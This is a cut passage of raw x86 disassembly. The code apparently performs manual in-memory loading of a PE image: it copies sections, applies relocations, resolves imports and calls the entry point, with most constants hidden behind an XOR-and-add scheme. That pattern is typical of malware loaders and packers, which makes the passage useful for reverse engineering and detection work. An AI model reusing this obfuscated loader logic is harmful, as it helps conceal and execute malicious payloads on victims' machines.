  41c1c6:	mov    ecx,DWORD PTR [eax]
  41c1c8:	mov    ecx,DWORD PTR [ecx+0x3c]
  41c1cb:	add    ecx,DWORD PTR [eax]
  41c1cd:	mov    DWORD PTR [ebp-0x4],0xf89ca5b9
  41c1d4:	mov    eax,DWORD PTR [ebp-0x4]
  41c1d7:	movzx  ecx,WORD PTR [ecx+0x16]
  41c1db:	xor    eax,0x7510899
  41c1e0:	add    eax,0x3272e0
  41c1e5:	pop    esi
  41c1e6:	test   ecx,eax
  41c1e8:	je     0x41c1f6
  41c1ea:	mov    eax,DWORD PTR [edx+0x1c8]
  41c1f0:	mov    DWORD PTR [eax],0xf89c85b8
  41c1f6:	leave  
  41c1f7:	ret    0x4
  41c1fa:	push   ebp
  41c1fb:	mov    ebp,esp
  41c1fd:	sub    esp,0x70
  41c200:	and    DWORD PTR [ebp-0x20],0x0
  41c204:	mov    DWORD PTR [ebp-0x18],0xf89cb5b9
  41c20b:	mov    DWORD PTR [ebp-0x1c],0xf89c85f9
  41c212:	mov    DWORD PTR [ebp-0x2c],0xf89c85bd
  41c219:	mov    DWORD PTR [ebp-0x14],0xf89c85bb
  41c220:	mov    DWORD PTR [ebp-0x2c],0xf89f05b9
  41c227:	mov    eax,DWORD PTR [ebp+0x20]
  41c22a:	mov    eax,DWORD PTR [eax+0x194]
  41c230:	mov    DWORD PTR [ebp-0xc],eax
  41c233:	mov    eax,DWORD PTR [ebp+0x20]
  41c236:	push   ebx
  41c237:	push   esi
  41c238:	mov    esi,DWORD PTR [eax+0x190]
  41c23e:	mov    eax,DWORD PTR [ebp+0x20]
  41c241:	mov    eax,DWORD PTR [eax+0x18c]
  41c247:	mov    DWORD PTR [ebp-0x8],eax
  41c24a:	mov    eax,DWORD PTR [eax]
  41c24c:	push   edi
  41c24d:	mov    DWORD PTR [ebp-0x4],esi
  41c250:	test   eax,eax
  41c252:	jne    0x41c25f
  41c254:	push   DWORD PTR [ebp+0x1c]
  41c257:	mov    edx,DWORD PTR [ebp+0x20]
  41c25a:	call   0x41c19e
  41c25f:	mov    eax,DWORD PTR [esi]
  41c261:	mov    ebx,DWORD PTR [esi]
  41c263:	add    ebx,DWORD PTR [eax+0x3c]
  41c266:	mov    eax,DWORD PTR [ebp+0xc]
  41c269:	mov    ecx,DWORD PTR [ebp-0x8]
  41c26c:	mov    ecx,DWORD PTR [ecx]
  41c26e:	mov    esi,0x7510899
  41c273:	xor    eax,esi
  41c275:	mov    edi,0x3272e0
  41c27a:	add    eax,edi
  41c27c:	cmp    eax,ecx
  41c27e:	jne    0x41c4b6
  41c284:	mov    eax,DWORD PTR [ebp-0xc]
  41c287:	mov    eax,DWORD PTR [eax]
  41c289:	mov    DWORD PTR [ebp-0x10],eax
  41c28c:	mov    eax,DWORD PTR [ebx+0x50]
  41c28f:	mov    DWORD PTR [ebp-0x68],eax
  41c292:	mov    eax,DWORD PTR [ebp-0x18]
  41c295:	xor    eax,esi
  41c297:	add    eax,edi
  41c299:	mov    DWORD PTR [ebp-0x64],eax
  41c29c:	mov    eax,DWORD PTR [ebp-0x14]
  41c29f:	and    DWORD PTR [ebp-0x6c],0x0
  41c2a3:	xor    eax,esi
  41c2a5:	add    eax,edi
  41c2a7:	mov    DWORD PTR [ebp-0x60],eax
  41c2aa:	lea    eax,[ebp-0x70]
  41c2ad:	push   eax
  41c2ae:	mov    eax,DWORD PTR [ebp+0x8]
  41c2b1:	xor    eax,esi
  41c2b3:	add    eax,edi
  41c2b5:	push   eax
  41c2b6:	mov    eax,DWORD PTR [ebp+0x20]
  41c2b9:	add    eax,0xaa
  41c2be:	push   eax
  41c2bf:	mov    eax,DWORD PTR [ebp+0x20]
  41c2c2:	mov    eax,DWORD PTR [eax+0x198]
  41c2c8:	mov    DWORD PTR [ebp-0x70],0x4
  41c2cf:	push   DWORD PTR [eax]
  41c2d1:	mov    eax,DWORD PTR [ebp+0x10]
  41c2d4:	call   eax
  41c2d6:	mov    ecx,DWORD PTR [ebp-0xc]
  41c2d9:	mov    ecx,DWORD PTR [ecx]
  41c2db:	mov    edx,DWORD PTR [ebp-0x8]
  41c2de:	mov    DWORD PTR [ebp-0x6c],eax
  41c2e1:	mov    DWORD PTR [ebp+0x1c],eax
  41c2e4:	mov    DWORD PTR [edx],ecx
  41c2e6:	mov    ecx,DWORD PTR [ebp-0x4]
  41c2e9:	mov    DWORD PTR [ecx],eax
  41c2eb:	mov    eax,DWORD PTR [ebx+0x50]
  41c2ee:	mov    DWORD PTR [ebp-0x68],eax
  41c2f1:	mov    eax,DWORD PTR [ebp-0x1c]
  41c2f4:	xor    eax,esi
  41c2f6:	add    eax,edi
  41c2f8:	mov    DWORD PTR [ebp-0x64],eax
  41c2fb:	lea    eax,[ebp-0x20]
  41c2fe:	mov    DWORD PTR [ebp-0x60],eax
  41c301:	lea    eax,[ebp-0x70]
  41c304:	push   eax
  41c305:	mov    eax,DWORD PTR [ebp+0x8]
  41c308:	xor    eax,esi
  41c30a:	add    eax,edi
  41c30c:	push   eax
  41c30d:	mov    eax,DWORD PTR [ebp+0x20]
  41c310:	add    eax,0xee
  41c315:	push   eax
  41c316:	mov    eax,DWORD PTR [ebp+0x20]
  41c319:	mov    eax,DWORD PTR [eax+0x198]
  41c31f:	mov    DWORD PTR [ebp-0x70],0x4
  41c326:	push   DWORD PTR [eax]
  41c328:	mov    eax,DWORD PTR [ebp+0x10]
  41c32b:	call   eax
  41c32d:	test   eax,eax
  41c32f:	je     0x41c354
  41c331:	and    DWORD PTR [ebp+0xc],0x0
  41c335:	cmp    DWORD PTR [ebx+0x50],0x0
  41c339:	jbe    0x41c354
  41c33b:	mov    eax,DWORD PTR [ebp+0x1c]
  41c33e:	mov    ecx,DWORD PTR [ebp-0x10]
  41c341:	sub    ecx,eax
  41c343:	mov    dl,BYTE PTR [ecx+eax*1]
  41c346:	inc    DWORD PTR [ebp+0xc]
  41c349:	mov    BYTE PTR [eax],dl
  41c34b:	mov    edx,DWORD PTR [ebp+0xc]
  41c34e:	inc    eax
  41c34f:	cmp    edx,DWORD PTR [ebx+0x50]
  41c352:	jb     0x41c343
  41c354:	mov    edx,DWORD PTR [ebp+0x1c]
  41c357:	mov    ecx,DWORD PTR [edx+0x3c]
  41c35a:	add    ecx,edx
  41c35c:	mov    eax,DWORD PTR [ecx+0xa0]
  41c362:	mov    ebx,DWORD PTR [ecx+0x28]
  41c365:	add    eax,edx
  41c367:	sub    edx,DWORD PTR [ebp-0x10]
  41c36a:	add    ebx,DWORD PTR [ebp+0x1c]
  41c36d:	mov    DWORD PTR [ebp+0xc],edx
  41c370:	mov    DWORD PTR [ebp-0x2c],ecx
  41c373:	mov    DWORD PTR [ebp-0x14],ebx
  41c376:	mov    DWORD PTR [ebp-0x8],0x0
  41c37d:	jmp    0x41c3f9
  41c37f:	add    edx,0xfffffff8
  41c382:	shr    edx,1
  41c384:	mov    DWORD PTR [ebp-0x18],edx
  41c387:	je     0x41c3e5
  41c389:	lea    edx,[eax+0x8]
  41c38c:	mov    DWORD PTR [ebp-0x4],edx
  41c38f:	mov    edx,DWORD PTR [ebp-0x18]
  41c392:	mov    DWORD PTR [ebp-0x18],edx
  41c395:	mov    edx,DWORD PTR [ebp-0x4]
  41c398:	movzx  edx,WORD PTR [edx]
  41c39b:	mov    DWORD PTR [ebp-0x24],edx
  41c39e:	and    edx,0xfff
  41c3a4:	mov    DWORD PTR [ebp-0x28],edx
  41c3a7:	mov    edx,DWORD PTR [ebp-0x24]
  41c3aa:	shr    edx,0xc
  41c3ad:	add    edx,0xffcd8d20
  41c3b3:	xor    edx,esi
  41c3b5:	cmp    edx,0xf89c85ba
  41c3bb:	jne    0x41c3dc
  41c3bd:	mov    edx,DWORD PTR [ebp-0x28]
  41c3c0:	add    edx,DWORD PTR [ebp+0x1c]
  41c3c3:	mov    ebx,DWORD PTR [eax]
  41c3c5:	cmp    DWORD PTR [ebx+edx*1],0x0
  41c3c9:	je     0x41c3d9
  41c3cb:	mov    ecx,DWORD PTR [ebp+0xc]
  41c3ce:	add    ecx,DWORD PTR [ebx+edx*1]
  41c3d1:	mov    ebx,DWORD PTR [eax]
  41c3d3:	mov    DWORD PTR [edx+ebx*1],ecx
  41c3d6:	mov    ecx,DWORD PTR [ebp-0x2c]
  41c3d9:	mov    ebx,DWORD PTR [ebp-0x14]
  41c3dc:	add    DWORD PTR [ebp-0x4],0x2
  41c3e0:	dec    DWORD PTR [ebp-0x18]
  41c3e3:	jne    0x41c395
  41c3e5:	mov    edx,DWORD PTR [ebp-0xc]
  41c3e8:	add    DWORD PTR [ebp-0x8],edx
  41c3eb:	mov    edx,DWORD PTR [ebp-0x8]
  41c3ee:	cmp    edx,DWORD PTR [ecx+0xa4]
  41c3f4:	jae    0x41c407
  41c3f6:	add    eax,DWORD PTR [ebp-0xc]
  41c3f9:	mov    edx,DWORD PTR [eax+0x4]
  41c3fc:	mov    DWORD PTR [ebp-0xc],edx
  41c3ff:	test   edx,edx
  41c401:	jne    0x41c37f
  41c407:	mov    eax,DWORD PTR [ebp-0x10]
  41c40a:	mov    DWORD PTR [ebp-0x6c],eax
  41c40d:	mov    DWORD PTR [ebp-0x70],0x4
  41c414:	mov    eax,DWORD PTR [ecx+0x50]
  41c417:	mov    DWORD PTR [ebp-0x68],eax
  41c41a:	mov    eax,DWORD PTR [ebp-0x1c]
  41c41d:	xor    eax,esi
  41c41f:	add    eax,edi
  41c421:	mov    DWORD PTR [ebp-0x64],eax
  41c424:	lea    eax,[ebp-0x20]
  41c427:	mov    DWORD PTR [ebp-0x60],eax
  41c42a:	lea    eax,[ebp-0x70]
  41c42d:	push   eax
  41c42e:	mov    eax,DWORD PTR [ebp+0x8]
  41c431:	xor    eax,esi
  41c433:	add    eax,edi
  41c435:	push   eax
  41c436:	mov    eax,DWORD PTR [ebp+0x20]
  41c439:	add    eax,0xee
  41c43e:	push   eax
  41c43f:	mov    eax,DWORD PTR [ebp+0x20]
  41c442:	mov    eax,DWORD PTR [eax+0x198]
  41c448:	push   DWORD PTR [eax]
  41c44a:	mov    eax,DWORD PTR [ebp+0x10]
  41c44d:	call   eax
  41c44f:	mov    eax,DWORD PTR [ebp+0x20]
  41c452:	mov    eax,DWORD PTR [eax+0x180]
  41c458:	add    eax,DWORD PTR [ebp+0xc]
  41c45b:	mov    ecx,DWORD PTR [ebp+0xc]
  41c45e:	push   DWORD PTR [ebp+0x18]
  41c461:	mov    DWORD PTR [eax],ecx
  41c463:	push   DWORD PTR [ebp+0x14]
  41c466:	push   DWORD PTR [ebp+0x1c]
  41c469:	call   ebx
  41c46b:	mov    ecx,DWORD PTR [ebp+0xc]
  41c46e:	add    ecx,DWORD PTR [ebp+0x20]
  41c471:	lea    eax,[ebp+0x4]
  41c474:	mov    DWORD PTR [ebp+0x20],ecx
  41c477:	mov    ecx,DWORD PTR [ebp+0x20]
  41c47a:	mov    ecx,DWORD PTR [ebp+0x20]
  41c47d:	mov    edx,DWORD PTR [ecx+0x190]
  41c483:	mov    ecx,DWORD PTR [ebp+0x20]
  41c486:	mov    ecx,DWORD PTR [ecx+0x18c]
  41c48c:	mov    esi,DWORD PTR [ecx]
  41c48e:	cmp    DWORD PTR [eax],esi
  41c490:	jb     0x41c4b1
  41c492:	mov    esi,DWORD PTR [edx]
  41c494:	mov    edi,DWORD PTR [edx]
  41c496:	mov    esi,DWORD PTR [esi+0x3c]
  41c499:	lea    esi,[edi+esi*1+0x50]
  41c49d:	mov    edi,DWORD PTR [ecx]
  41c49f:	add    edi,DWORD PTR [esi]
  41c4a1:	cmp    DWORD PTR [eax],edi
  41c4a3:	jae    0x41c4b1
  41c4a5:	mov    esi,DWORD PTR [ecx]
  41c4a7:	mov    ecx,DWORD PTR [eax]
  41c4a9:	mov    edx,DWORD PTR [edx]
  41c4ab:	sub    ecx,esi
  41c4ad:	add    edx,ecx
  41c4af:	mov    DWORD PTR [eax],edx
  41c4b1:	mov    eax,DWORD PTR [ebp+0xc]
  41c4b4:	jmp    0x41c4b8
  41c4b6:	xor    eax,eax
  41c4b8:	pop    edi
  41c4b9:	pop    esi
  41c4ba:	pop    ebx
  41c4bb:	leave  
  41c4bc:	ret    0x1c
  41c4bf:	push   ebp
  41c4c0:	mov    ebp,esp
  41c4c2:	sub    esp,0x1c
  41c4c5:	push   esi
  41c4c6:	mov    esi,eax
  41c4c8:	mov    eax,DWORD PTR [ecx+0x190]
  41c4ce:	cmp    DWORD PTR [eax],0x0
  41c4d1:	je     0x41c5e1
  41c4d7:	test   edx,edx
  41c4d9:	je     0x41c5e1
  41c4df:	test   esi,esi
  41c4e1:	je     0x41c5e1
  41c4e7:	mov    eax,DWORD PTR [esi+0x88]
  41c4ed:	test   eax,eax
  41c4ef:	je     0x41c5dc
  41c4f5:	cmp    DWORD PTR [esi+0x8c],0x10
  41c4fc:	je     0x41c5dc
  41c502:	cmp    DWORD PTR [esi+0x34],edx
  41c505:	je     0x41c5dc
  41c50b:	mov    esi,DWORD PTR [ecx+0x18c]
  41c511:	and    DWORD PTR [ebp-0x10],0x0
  41c515:	mov    ecx,edx
  41c517:	sub    ecx,DWORD PTR [esi]
  41c519:	add    eax,edx
  41c51b:	movzx  edx,WORD PTR [eax+0xc]
  41c51f:	mov    DWORD PTR [ebp-0x1c],ecx
  41c522:	movzx  ecx,WORD PTR [eax+0xe]
  41c526:	add    ecx,edx
  41c528:	je     0x41c5dc
  41c52e:	lea    ecx,[eax+0x14]
  41c531:	push   ebx
  41c532:	mov    DWORD PTR [ebp-0x18],ecx
  41c535:	mov    esi,0x7fffffff
  41c53a:	push   edi
  41c53b:	test   DWORD PTR [ecx],esi
  41c53d:	je     0x41c5be
  41c53f:	mov    edx,DWORD PTR [ecx]
  41c541:	and    DWORD PTR [ebp-0xc],0x0
  41c545:	and    edx,esi
  41c547:	add    edx,eax
  41c549:	movzx  edi,WORD PTR [edx+0xe]
  41c54d:	movzx  ebx,WORD PTR [edx+0xc]
  41c551:	add    edi,ebx
  41c553:	je     0x41c5be
  41c555:	lea    ecx,[edx+0x14]
  41c558:	mov    DWORD PTR [ebp-0x14],ecx
  41c55b:	test   DWORD PTR [ecx],esi
  41c55d:	je     0x41c5a0
  41c55f:	mov    ecx,DWORD PTR [ecx]
  41c561:	and    DWORD PTR [ebp-0x8],0x0
  41c565:	and    ecx,esi
  41c567:	add    ecx,eax
  41c569:	movzx  edi,WORD PTR [ecx+0xe]
  41c56d:	movzx  ebx,WORD PTR [ecx+0xc]
  41c571:	add    edi,ebx
  41c573:	je     0x41c5a0
  41c575:	lea    edi,[ecx+0x14]
  41c578:	mov    DWORD PTR [ebp-0x4],edi
  41c57b:	mov    edi,DWORD PTR [ebp-0x4]
  41c57e:	mov    edi,DWORD PTR [edi]
  41c580:	test   edi,edi
  41c582:	je     0x41c58a
  41c584:	mov    ebx,DWORD PTR [ebp-0x1c]
  41c587:	add    DWORD PTR [edi+eax*1],ebx
  41c58a:	movzx  edi,WORD PTR [ecx+0xe]
  41c58e:	movzx  ebx,WORD PTR [ecx+0xc]
  41c592:	inc    DWORD PTR [ebp-0x8]
  41c595:	add    DWORD PTR [ebp-0x4],0x8
  41c599:	add    edi,ebx
  41c59b:	cmp    DWORD PTR [ebp-0x8],edi
  41c59e:	jb     0x41c57b
  41c5a0:	movzx  edi,WORD PTR [edx+0xe]
  41c5a4:	movzx  ebx,WORD PTR [edx+0xc]
  41c5a8:	mov    ecx,DWORD PTR [ebp-0x14]
  41c5ab:	inc    DWORD PTR [ebp-0xc]
  41c5ae:	add    ecx,0x8
  41c5b1:	add    edi,ebx
  41c5b3:	mov    DWORD PTR [ebp-0x14],ecx
  41c5b6:	cmp    DWORD PTR [ebp-0xc],edi
  41c5b9:	jb     0x41c55b
  41c5bb:	mov    ecx,DWORD PTR [ebp-0x18]
  41c5be:	movzx  edx,WORD PTR [eax+0xe]
  41c5c2:	movzx  edi,WORD PTR [eax+0xc]
  41c5c6:	inc    DWORD PTR [ebp-0x10]
  41c5c9:	add    ecx,0x8
  41c5cc:	add    edx,edi
  41c5ce:	mov    DWORD PTR [ebp-0x18],ecx
  41c5d1:	cmp    DWORD PTR [ebp-0x10],edx
  41c5d4:	jb     0x41c53b
  41c5da:	pop    edi
  41c5db:	pop    ebx
  41c5dc:	xor    eax,eax
  41c5de:	inc    eax
  41c5df:	jmp    0x41c5e3
  41c5e1:	xor    eax,eax
  41c5e3:	pop    esi
  41c5e4:	leave  
  41c5e5:	ret    
  41c5e6:	push   ebp
  41c5e7:	mov    ebp,esp
  41c5e9:	mov    ecx,DWORD PTR [ecx+0x190]
  41c5ef:	mov    eax,DWORD PTR [ebp+0xc]
  41c5f2:	sub    esp,0x10
  41c5f5:	push   ebx
  41c5f6:	xor    ebx,ebx
  41c5f8:	push   esi
  41c5f9:	push   edi
  41c5fa:	cmp    DWORD PTR [ecx],ebx
  41c5fc:	je     0x41c684
  41c602:	cmp    eax,ebx
  41c604:	je     0x41c684
  41c606:	cmp    DWORD PTR [eax+0x78],ebx
  41c609:	jne    0x41c610
  41c60b:	xor    eax,eax
  41c60d:	inc    eax
  41c60e:	jmp    0x41c686
  41c610:	mov    eax,DWORD PTR [eax+0x78]
  41c613:	add    eax,DWORD PTR [ebp+0x8]
  41c616:	mov    ecx,DWORD PTR [eax+0x1c]
  41c619:	mov    edx,DWORD PTR [eax+0x24]
  41c61c:	mov    esi,DWORD PTR [eax+0x14]
  41c61f:	mov    edi,DWORD PTR [eax+0x18]
  41c622:	add    ecx,DWORD PTR [ebp+0x8]
  41c625:	add    edx,DWORD PTR [ebp+0x8]
  41c628:	mov    DWORD PTR [ebp-0x4],esi
  41c62b:	cmp    esi,edi
  41c62d:	ja     0x41c632
  41c62f:	mov    DWORD PTR [ebp-0x4],edi
  41c632:	mov    DWORD PTR [ebp-0x8],ebx
  41c635:	cmp    DWORD PTR [ebp-0x4],ebx
  41c638:	jbe    0x41c60b
  41c63a:	cmp    ebx,DWORD PTR [eax+0x14]
  41c63d:	jae    0x41c645
  41c63f:	movzx  esi,WORD PTR [edx+ebx*2]
  41c643:	jmp    0x41c647
  41c645:	mov    esi,ebx
  41c647:	lea    esi,[ecx+esi*4]
  41c64a:	mov    edi,DWORD PTR [esi]
  41c64c:	test   edi,edi
  41c64e:	je     0x41c679
  41c650:	add    edi,DWORD PTR [ebp+0x8]
  41c653:	mov    DWORD PTR [ebp-0x10],edi
  41c656:	cmp    edi,eax
  41c658:	jbe    0x41c66a
  41c65a:	mov    ebx,DWORD PTR [ebp+0xc]
  41c65d:	mov    ebx,DWORD PTR [ebx+0x7c]
  41c660:	add    ebx,eax
  41c662:	cmp    edi,ebx
  41c664:	jae    0x41c66a
  41c666:	mov    esi,DWORD PTR [esi]
  41c668:	jmp    0x41c672
  41c66a:	sub    edi,DWORD PTR [ebp+0x8]
  41c66d:	mov    DWORD PTR [esi],edi
  41c66f:	mov    esi,DWORD PTR [ebp-0x10]
  41c672:	test   esi,esi
  41c674:	je     0x41c684
  41c676:	mov    ebx,DWORD PTR [ebp-0x8]
  41c679:	inc    ebx
  41c67a:	mov    DWORD PTR [ebp-0x8],ebx
  41c67d:	cmp    ebx,DWORD PTR [ebp-0x4]
  41c680:	jb     0x41c63a
  41c682:	jmp    0x41c60b
  41c684:	xor    eax,eax
  41c686:	pop    edi
  41c687:	pop    esi
  41c688:	pop    ebx
  41c689:	leave  
  41c68a:	ret    0x8
  41c68d:	push   ebp
  41c68e:	mov    ebp,esp
  41c690:	sub    esp,0x2c
  41c693:	mov    edx,0xf89c85b9
  41c698:	mov    DWORD PTR [ebp-0x4],edx
  41c69b:	mov    DWORD PTR [ebp-0x8],0xf89c85b8
  41c6a2:	mov    eax,DWORD PTR [ebp-0x4]
  41c6a5:	mov    ecx,DWORD PTR [ebp-0x4]
  41c6a8:	mov    ecx,DWORD PTR [ebp-0x4]
  41c6ab:	mov    ecx,DWORD PTR [ebp-0x4]
  41c6ae:	mov    ecx,DWORD PTR [ebp-0x4]
  41c6b1:	mov    ecx,DWORD PTR [ebp-0x4]
  41c6b4:	push   ebx
  41c6b5:	mov    ebx,DWORD PTR [ebp+0x10]
  41c6b8:	push   esi
  41c6b9:	mov    esi,0x7510899
  41c6be:	mov    DWORD PTR [ebp-0x10],0x352eb0f
  41c6c5:	mov    ecx,DWORD PTR [ebp-0x4]
  41c6c8:	mov    ebx,DWORD PTR [ebx+0x190]
  41c6ce:	push   edi
  41c6cf:	mov    edi,0x3272e0
  41c6d4:	xor    ecx,esi
  41c6d6:	xor    eax,esi
  41c6d8:	add    eax,edi
  41c6da:	add    ecx,edi
  41c6dc:	mov    DWORD PTR [ebp-0x18],eax
  41c6df:	cmp    ecx,DWORD PTR [ebx]
  41c6e1:	je     0x41c962
  41c6e7:	mov    ebx,DWORD PTR [ebp-0x4]
  41c6ea:	mov    ecx,DWORD PTR [ebp+0xc]
  41c6ed:	xor    ebx,esi
  41c6ef:	add    ebx,edi
  41c6f1:	cmp    ebx,ecx
  41c6f3:	je     0x41c962
  41c6f9:	mov    ebx,DWORD PTR [ebp-0x4]
  41c6fc:	mov    ecx,DWORD PTR [ecx+0x80]
  41c702:	xor    ebx,esi
  41c704:	add    ebx,edi
  41c706:	cmp    ecx,ebx
  41c708:	je     0x41c95d
  41c70e:	add    ecx,DWORD PTR [ebp+0x8]
  41c711:	mov    DWORD PTR [ebp-0x2c],ecx
  41c714:	mov    ebx,edx
  41c716:	xor    ebx,esi
  41c718:	add    ebx,edi
  41c71a:	mov    DWORD PTR [ebp-0x10],ebx
  41c71d:	mov    ebx,DWORD PTR [ebp-0x10]
  41c720:	cmp    ebx,edx
  41c722:	je     0x41c736
  41c724:	mov    edx,DWORD PTR [ebp-0x10]
  41c727:	mov    ebx,DWORD PTR [ebp-0x4]
  41c72a:	imul   edx,edx,0x14
  41c72d:	xor    ebx,esi
  41c72f:	add    ebx,edi
  41c731:	cmp    DWORD PTR [edx+ecx*1],ebx
  41c734:	jne    0x41c74d
  41c736:	mov    edx,DWORD PTR [ebp-0x10]
  41c739:	mov    ebx,DWORD PTR [ebp-0x4]
  41c73c:	imul   edx,edx,0x14
  41c73f:	xor    ebx,esi
  41c741:	add    ebx,edi
  41c743:	cmp    DWORD PTR [edx+ecx*1+0x10],ebx
  41c747:	je     0x41c94f
  41c74d:	mov    eax,DWORD PTR [ebp-0x4]
  41c750:	mov    ebx,DWORD PTR [ebp-0x4]
  41c753:	mov    eax,DWORD PTR [ebp-0x10]
  41c756:	imul   eax,eax,0x14
  41c759:	add    eax,ecx
  41c75b:	mov    ecx,DWORD PTR [eax+0x10]
  41c75e:	add    ecx,DWORD PTR [ebp+0x8]
  41c761:	xor    ebx,esi
  41c763:	mov    DWORD PTR [ebp-0x1c],ecx
  41c766:	mov    ecx,DWORD PTR [ebp-0x4]
  41c769:	mov    edx,DWORD PTR [ebp-0x4]
  41c76c:	xor    ecx,esi
  41c76e:	add    ecx,edi
  41c770:	xor    edx,esi
  41c772:	mov    DWORD PTR [ebp-0x24],ecx
  41c775:	mov    ecx,DWORD PTR [eax]
  41c777:	add    edx,edi
  41c779:	add    ebx,edi
  41c77b:	cmp    ecx,edx
  41c77d:	je     0x41c785
  41c77f:	add    ecx,DWORD PTR [ebp+0x8]
  41c782:	mov    DWORD PTR [ebp-0x24],ecx
  41c785:	mov    ecx,DWORD PTR [ebp-0x4]
  41c788:	xor    ecx,esi
  41c78a:	add    ecx,DWORD PTR [eax+0xc]
  41c78d:	mov    eax,DWORD PTR [ebp+0x8]
  41c790:	lea    eax,[ecx+eax*1+0x3272e0]
  41c797:	mov    DWORD PTR [ebp+0xc],eax
  41c79a:	mov    DWORD PTR [ebp-0x28],0xf89c85bc
  41c7a1:	mov    eax,DWORD PTR [ebp+0x10]
  41c7a4:	push   DWORD PTR [ebp+0xc]
  41c7a7:	mov    eax,DWORD PTR [eax+0x1d8]
  41c7ad:	call   DWORD PTR [eax]
  41c7af:	mov    ecx,DWORD PTR [ebp-0x4]
  41c7b2:	xor    ecx,esi
  41c7b4:	add    ecx,edi
  41c7b6:	mov    DWORD PTR [ebp-0xc],eax
  41c7b9:	cmp    ecx,eax
  41c7bb:	jne    0x41c7cf
  41c7bd:	mov    eax,DWORD PTR [ebp+0x10]
  41c7c0:	push   DWORD PTR [ebp+0xc]
  41c7c3:	mov    eax,DWORD PTR [eax+0x1d8]
  41c7c9:	call   DWORD PTR [eax+0xc]
  41c7cc:	mov    DWORD PTR [ebp-0xc],eax
  41c7cf:	mov    DWORD PTR [ebp-0x20],0x7f661b00
  41c7d6:	mov    DWORD PTR [ebp-0x20],0xf89c9990
  41c7dd:	mov    eax,DWORD PTR [ebp-0x4]
  41c7e0:	xor    eax,esi
  41c7e2:	add    eax,edi
  41c7e4:	cmp    eax,DWORD PTR [ebp-0xc]
  41c7e7:	jne    0x41c80c
  41c7e9:	mov    eax,DWORD PTR [ebp-0x8]
  41c7ec:	mov    ecx,DWORD PTR [ebp-0x20]
  41c7ef:	xor    eax,esi
  41c7f1:	xor    ecx,esi
  41c7f3:	lea    ebx,[ebx+eax*1+0x3272e0]
  41c7fa:	mov    eax,DWORD PTR [ebp+0x10]
  41c7fd:	mov    eax,DWORD PTR [eax+0x1d8]
  41c803:	add    ecx,edi
  41c805:	imul   ecx,ebx
  41c808:	push   ecx
  41c809:	call   DWORD PTR [eax+0x24]
  41c80c:	mov    eax,DWORD PTR [ebp-0x4]
  41c80f:	xor    eax,esi
  41c811:	add    eax,edi
  41c813:	cmp    eax,DWORD PTR [ebp-0xc]
  41c816:	jne    0x41c827
  41c818:	mov    eax,DWORD PTR [ebp-0x28]
  41c81b:	xor    eax,esi
  41c81d:	add    eax,edi
  41c81f:	cmp    ebx,eax
  41c821:	jbe    0x41c7a1
  41c827:	mov    eax,DWORD PTR [ebp-0x4]
  41c82a:	xor    eax,esi
  41c82c:	add    eax,edi
  41c82e:	cmp    eax,DWORD PTR [ebp-0xc]
  41c831:	jne    0x41c84a
  41c833:	mov    eax,DWORD PTR [ebp-0x8]
  41c836:	mov    ecx,DWORD PTR [ebp-0x18]
  41c839:	xor    eax,esi
  41c83b:	lea    eax,[ecx+eax*1+0x3272e0]
  41c842:	mov    DWORD PTR [ebp-0x18],eax
  41c845:	jmp    0x41c939
  41c84a:	mov    DWORD PTR [ebp-0x14],0x1121b01
  41c851:	mov    DWORD PTR [ebp+0xc],0xe042d0f
  41c858:	mov    ebx,DWORD PTR [ebp-0x4]
  41c85b:	xor    ebx,esi
  41c85d:	add    ebx,edi
  41c85f:	jmp    0x41c926
  41c864:	mov    eax,DWORD PTR [ebp-0x4]
  41c867:	xor    eax,esi
  41c869:	add    eax,edi
  41c86b:	mov    DWORD PTR [ebp-0x14],eax
  41c86e:	mov    eax,DWORD PTR [ebp-0x4]
  41c871:	xor    eax,esi
  41c873:	add    eax,edi
  41c875:	mov    DWORD PTR [ebp+0xc],eax
  41c878:	mov    ecx,DWORD PTR [ebp-0x4]
  41c87b:	mov    eax,DWORD PTR [ebp-0x24]
  41c87e:	xor    ecx,esi
  41c880:	add    ecx,edi
  41c882:	cmp    ecx,eax
  41c884:	je     0x41c88c
  41c886:	mov    eax,DWORD PTR [eax+ebx*4]
  41c889:	mov    DWORD PTR [ebp-0x14],eax
  41c88c:	mov    eax,DWORD PTR [ebp-0x1c]
  41c88f:	mov    eax,DWORD PTR [eax+ebx*4]
  41c892:	mov    DWORD PTR [ebp+0xc],eax
  41c895:	mov    eax,DWORD PTR [ebp-0x4]
  41c898:	mov    ecx,DWORD PTR [ebp-0x14]
  41c89b:	xor    eax,esi
  41c89d:	add    eax,edi
  41c89f:	cmp    eax,ecx
  41c8a1:	je     0x41c8cc
  41c8a3:	mov    eax,DWORD PTR [ebp-0x4]
  41c8a6:	mov    ecx,DWORD PTR [ebp-0x14]
  41c8a9:	xor    eax,esi
  41c8ab:	add    eax,edi
  41c8ad:	shr    ecx,0x1f
  41c8b0:	cmp    eax,ecx
  41c8b2:	je     0x41c8cc
  41c8b4:	mov    ecx,DWORD PTR [ebp-0x14]
  41c8b7:	mov    eax,DWORD PTR [ebp+0x10]
  41c8ba:	mov    eax,DWORD PTR [eax+0x1d8]
  41c8c0:	movzx  ecx,cx
  41c8c3:	push   ecx
  41c8c4:	push   DWORD PTR [ebp-0xc]
  41c8c7:	call   DWORD PTR [eax+0x8]
  41c8ca:	jmp    0x41c8e5
  41c8cc:	mov    eax,DWORD PTR [ebp+0xc]
  41c8cf:	add    eax,DWORD PTR [ebp+0x8]
  41c8d2:	mov    ecx,DWORD PTR [ebp+0x10]
  41c8d5:	mov    ecx,DWORD PTR [ecx+0x1d8]
  41c8db:	add    eax,0x2
  41c8de:	push   eax
  41c8df:	push   DWORD PTR [ebp-0xc]
  41c8e2:	call   DWORD PTR [ecx+0x8]
  41c8e5:	mov    DWORD PTR [ebp+0xc],eax
  41c8e8:	mov    eax,DWORD PTR [ebp-0x4]
  41c8eb:	mov    ecx,DWORD PTR [ebp+0xc]
  41c8ee:	xor    eax,esi
  41c8f0:	add    eax,edi
  41c8f2:	cmp    eax,ecx
  41c8f4:	mov    eax,DWORD PTR [ebp-0x8]
  41c8f7:	jne    0x41c90a
  41c8f9:	mov    ecx,DWORD PTR [ebp-0x18]
  41c8fc:	xor    eax,esi
  41c8fe:	lea    eax,[ecx+eax*1+0x3272e0]
  41c905:	mov    DWORD PTR [ebp-0x18],eax
  41c908:	jmp    0x41c91a
  41c90a:	mov    ecx,DWORD PTR [ebp+0xc]
  41c90d:	xor    eax,esi
  41c90f:	add    eax,edi
  41c911:	imul   eax,ecx
  41c914:	mov    ecx,DWORD PTR [ebp-0x1c]
  41c917:	mov    DWORD PTR [ecx+ebx*4],eax
